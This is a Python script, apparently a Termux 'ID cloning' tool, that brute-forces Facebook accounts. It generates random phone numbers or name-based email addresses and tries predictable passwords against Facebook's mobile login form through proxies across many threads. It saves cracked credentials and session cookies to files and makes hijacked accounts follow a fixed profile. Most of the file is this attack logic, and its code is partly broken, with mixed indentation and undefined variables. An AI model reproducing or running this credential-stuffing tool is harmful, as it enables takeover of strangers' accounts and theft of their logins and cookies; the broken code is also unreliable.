#---------------------[IMPORT]---------------------#
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; The Davil \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
# from rich import print as printer
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Hamii.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
#---------------------------------------------------------------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
twf = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#-----------------------[DATE CHECKER]-----------------------#
def Jawnx(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :hking = ' 2009'
        elif uid[:9] in ['100000000']       :hking = '~> 2009'
        elif uid[:8] in ['10000000']        :hking = '~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:hking = '~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:hking = ' 2010'
        elif uid[:6] in ['100001']          :hking = '~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :hking = '~> 2011/2012'
        elif uid[:6] in ['100004']          :hking = '~> 2012/2013'
        elif uid[:6] in ['100005','100006'] :hking = '~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :hking = '~> 2014/2015'
        elif uid[:6] in ['100009']          :hking = '~> 2015'
        elif uid[:5] in ['10001']           :hking = '~> 2015/2016'
        elif uid[:5] in ['10002']           :hking = '~> 2016/2017'
        elif uid[:5] in ['10003']           :hking = '~> 2018/2019'
        elif uid[:5] in ['10004']           :hking = '~> 2019/2020'
        elif uid[:5] in ['10005']           :hking = '~> 2020'
        elif uid[:5] in ['10006','10007','']:hking = '~> 2021'
        elif uid[:5] in ['10008']           :hking = '~> 2022'
        elif uid[:5] in ['10009']           :hking = '~> 2023'
        else:hking=''
    elif len(uid) in [9,10]:
        hking = '~> 2008/2009'
    elif len(uid)==8:
        hking = '~> 2007/2008'
    elif len(uid)==7:
        hking = '~> 2006/2007'
    else:hking=''
    return hking
    #-----------------------[LOOP]-----------------------#
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://github.com/MUMIT-404-CYBER')
logo = ("""
\x1b[97;1m   ████████  ██████  ██   ██ ██  ██████    ███    ██ 
\x1b[97;1m      ██    ██    ██  ██ ██  ██ ██         ████   ██ 
\x1b[97;1m      ██    ██    ██   ███   ██ ██         ██ ██  ██ 
\x1b[97;1m      ██    ██    ██  ██ ██  ██ ██         ██  ██ ██ 
\x1b[97;1m      ██     ██████  ██   ██ ██  ██████ \033[38;5;196m██ \x1b[97;1m██   ████ 

\x1b[97;1m  ╔═══════════════════════════════════════════════════╗
\x1b[97;1m  ║      [\033[38;5;196m+\x1b[97;1m] \x1b[97;1mToxic.N I'd Cloning Tools\x1b[97;1m  [\033[38;5;196m+\x1b[97;1m]           ║
\x1b[97;1m  ╠═════════\033[38;5;196mo00\x1b[97;1m═════════════\033[38;5;196m〄\x1b[97;1m═══════════\033[38;5;196m00o\x1b[97;1m══════════╣
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mName     : \x1b[97;1mToxic.N I'd Cloning Tools          \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mGithub   : \x1b[97;1mhttps://github.com/Toxic-N-404     \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mWhatsapp : \x1b[97;1m+88016********                     \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mVersion  : \x1b[97;1m1.2.0\x1b[1;94m	                      \x1b[97;1m║
\x1b[97;1m  ╚═════════\033[38;5;196mo00\x1b[97;1m═════════════\033[38;5;196m〄\x1b[97;1m═══════════\033[38;5;196m00o\x1b[97;1m══════════╝""")
#---------------------[LOOP MENU]---------------------#
loop = 0
cp = []
ok = []
twf = []


#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'  \r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')
    else:
        print(f'  \r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
        for i in range(len(game)):
            print(f"  \r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            #created by hbf team(owner) Hamii
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'  \r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')
        print()
    else:
        print(f'  \r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')
        for i in range(len(game)):
            print(f"  \r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print()

 

def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
#---------------------[MAIN MENU]---------------------#
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.twf = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("  [01] Random Number Clone")
        print("  [02] Random Email Clone ")
        print("  [00] Exit")
        print("\033[0m  𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙")
        Mumit =input("  [?] Choose : ")
        os.system('xdg-open https://facebook.com/groups/termuxteambd/')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print('  [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    print("\033[0m  𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙")
    kode = input('  [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('  [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[0m  𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙")
    limit = int(input('  [?] Crack Limit : '))
    for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
        ip = requests.get("https://api.ipify.org").text
        jalan("  [+]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
        print(' \033[0m [+] Total ids:\033[38;5;45m '+tl)
        print(' \033[0m [+] Process has been started')
        print(' \033[0m [!] Wait for ids ')
        print(' \033[0m [!] Use flight mode for speed up ')
        print("\033[0m  𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
    print('  [+] Crack process has been completed')
    print('  [+] Ids saved in ok.txt,cp.txt')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  [?] Target fast name : ')
    os.system('clear')
    print(logo)
    kodex = input('  [?] Target last name :  ')
    os.system('clear')
    print(logo)
    print('  [+] EXAMPLE : @gmail.com, @yahoo.com ')
    print("\033[0m  𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙")
    doamin = input('  [?] Terget doamin : ')
    os.system('clear')
    print(logo)
    print('  [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[0m  𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙")
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
        ip = requests.get("https://api.ipify.org").text
        jalan("  [+]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
        print(' \033[0m [+] Total ids:\033[38;5;45m '+tl)
        print(' \033[0m [+] Process has been started')
        print(' \033[0m [!] Wait for ids ')
        print(' \033[0m [!] Use flight mode for speed up ')
        print("\033[0m  𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'@@@',kode+'###',kode+'@1234',kode+'@123',kode+'@12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',kodex+'@@@',kodex+'###',kodex+'@1234',kodex+'@123',kodex+'@12345',]
            yaari.submit(rcrack1,uid,pwx,tl)
    print('  [+] Crack process has been completed')
    print('  [+] Ids saved in ok.txt,cp.txt')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global twf
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r [\033[38;5;46mTX\033[1;97m] [\033[38;5;45m%s\033[0m/%s] [OK\033[1;97m:-\033[38;5;46m%s\033[1;97m] [CP\033[1;97m:-\033[38;5;196m%s\033[1;97m] [2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AffNHiEkem8kLgwWBIW3EFsu0vpg8RpRucM-p4NArG2I4LkBRWRd2GIJQ20-jmC9DxOZCAsAnG5MBoQ50ID8tvOP8QKWbPNraeqicU3CML1sqg&smuh=52779&lh=Ac8j6v9a_PfzQcLalAQ&refid=7&ref_component=mbasic_footer&_rdr',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #os.system("play-audio HAMII_OK.mp3")
                print(f'\r\x1b[38;5;46m[OK] [🤩] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                print(f" Cookie : {coki}")
                cek_apk(session,coki)
                open('/sdcard/Toxic-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio HAMII_2F.mp3")
                    print('\r\x1b[38;5;45m[2F] [🤧] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/Toxic-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio HAMII_CP.mp3")
                    print(f'\r\x1b[38;5;191m[CP] [☠️] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/Toxic-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f' \r\033[m[TX] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
